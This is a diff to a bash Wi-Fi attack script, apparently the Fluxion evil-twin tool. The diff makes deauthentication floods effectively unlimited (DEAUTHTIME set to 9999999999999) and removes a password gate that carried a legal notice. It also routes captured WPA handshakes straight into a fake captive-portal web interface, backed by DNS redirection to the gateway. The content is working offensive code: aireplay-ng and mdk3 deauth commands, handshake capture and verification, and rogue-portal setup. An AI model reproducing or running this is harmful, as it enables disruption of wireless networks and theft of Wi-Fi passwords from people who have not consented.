@@ -23,7 +23,7 @@ WORK_DIR=`pwd`
 ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`
 # Deauth duration during handshake capture
 # oo
-DEAUTHTIME="15"
+DEAUTHTIME="9999999999999"
 revision=54
 version=0.23
 IP=192.168.1.1
@@ -1053,7 +1053,17 @@ function chinese {
 }
 # Choose Interface
 function setinterface {
-	conditional_clear
+  Sites="~/fluxion/stable/Sites"
+  airmonfile="~/fluxion/stable/airmon"
+  if [ ! -d "$Sites" ]; then
+  	cp -r ~/fluxion/Sites ~/fluxion/stable/ &>$flux_output_device
+  fi
+
+  if [ ! -f "$airmonfile" ]; then
+  	cp -r ~/fluxion/airmon ~/fluxion/stable/ &>$flux_output_device
+  fi
+
+  conditional_clear
 	top
 	#unblock interfaces
 	rfkill unblock all
@@ -1132,34 +1142,10 @@ function deltax {
 
 	rm -rf $DUMP_PATH/*
 
-	iq
+	choosescan
 	selection
 }
 
-#iq check
-function iq {
-
-  conditional_clear
-
-	while true; do
-		conditional_clear
-		top
-    echo ""
-    echo -e "${red}IQ ChecK ${transparent}"
-    echo
-    echo "Type the password to continue"
-    echo "Please respect your law in your country"
-		echo -e "Password: $red lkswop $transparent"
-		echo "                                       "
-		echo -n "      #> "
-		read yn
-		echo ""
-		case $yn in
-			lkswop ) choosescan ; break ;;
-			* ) echo "IQ test failed, exit...";sleep 2; exitmode ;;
-		  esac
-	done
-}
 # Select channel
 function choosescan {
 
@@ -1426,7 +1412,7 @@ function askauth {
 		echo ""
 		case $yn in
 			1 ) authmode="handshake"; handshakelocation; break ;;
-			2 ) authmode="wpa_supplicant";  certssl; break ;;
+			2 ) authmode="wpa_supplicant";  webinterface; break ;;
 			3 ) askAP; break ;;
 			* ) echo "$general_case_error"; conditional_clear ;;
 		esac
@@ -3237,7 +3223,7 @@ function handshakelocation {
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
 					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						 certssl
+						 webinterface
 					else
 					echo "Corrupted handshake"
 					echo
@@ -3253,7 +3239,7 @@ function handshakelocation {
 					else
 						if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
 							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-							certssl
+							webinterface
 						else
 							echo "Corrupted handshake"
 							sleep 4
@@ -3399,21 +3385,33 @@ function deauth {
 
 function deauthMENU {
 
-
+	while true; do
 		conditional_clear
 
 		clear
 		top
 
-		echo "$header_deauthMENU / automatic Handshake check "
+		echo "$header_deauthMENU "
 		echo
 		echo -e "Status handshake: $Handshake_statuscheck"
 		echo
-		echo -e "      "$grey"1)"$transparent" $deauthMENU_option_1"
-		echo -e "      "$grey"2)"$transparent" $general_back (Select another deauth method)"
-		echo -e "      "$grey"3)"$transparent" Select another network"
-		echo -e "      "$grey"4)"$transparent" Exit"
+		echo -e "      "$blue"1)"$transparent" $deauthMENU_option_1"
+		echo -e "      "$blue"2)"$transparent" $general_back (Select another deauth method)"
+		echo -e "      "$blue"3)"$transparent" Select another network"
+		echo -e "      "$blue"4)"$transparent" Exit"
+		echo -n '      #> '
+		read yn
 
+		case $yn in
+			1 ) checkhandshake;;
+			2 ) conditional_clear; askclientsel; break;;
+			3 ) killall airodump-ng mdk3 aireplay-ng xterm &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
+			4 ) exitmode; break;;
+			* ) echo "
+$general_case_error"; conditional_clear ;;
+		esac
+
+	done
 }
 
 # Capture all
@@ -3434,9 +3432,8 @@ function checkhandshake {
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			wpaclean $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
-			certssl
+			webinterface
 			i=2
-      y=2
 			break
 
 		else
@@ -3449,9 +3446,8 @@ function checkhandshake {
 		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap strip &>$flux_output_device
-			certssl
+			webinterface
 			i=2
-      y=2
 			break
 
 		else
@@ -3858,26 +3854,22 @@ mimetype.assign = (
 \".css\" => \"text/css\"
 )
 
-
 server.error-handler-404 = \"/\"
 
 static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
 index-file.names = ( \"index.htm\" )
 
-\$SERVER[\"socket\"] == \":443\" {
-	url.redirect = ( \"^/(.*)\" => \"192.168.1.1\")
-	ssl.engine                  = \"enable\"
-	ssl.pemfile                 = \"/root/server.pem\"
 
-}
 
 #Redirect www.domain.com to domain.com
 \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
 	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
-	ssl.engine                  = \"enable\"
-	ssl.pemfile                 = \"/root/server.pem\"
+
+
 }
+
 " >$DUMP_PATH/lighttpd.conf
+
 # that redirects all DNS requests to the gateway
 echo "import socket
 
@@ -4203,38 +4195,25 @@ function handshakecheck {
 
 
 ############################################## < STUFF > ############################################
-y=1
+
 # Deauth all
 function deauthall {
-  while true; do
-  deauthMENU
+
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
-  sleep 15
-  checkhandshake
-done
 }
 
-
 function deauthmdk3 {
-  while true; do
-  deauthMENU
-  echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
+
+	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
-  sleep 15
-  checkhandshake
-done
 }
 
 # Deauth to a specific target
 function deauthesp {
-  while true;do
-  deauthMENU
+
 	sleep 2
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
-  sleep 15
-  checkhandshake
-done
 }
 
 # Close all processes
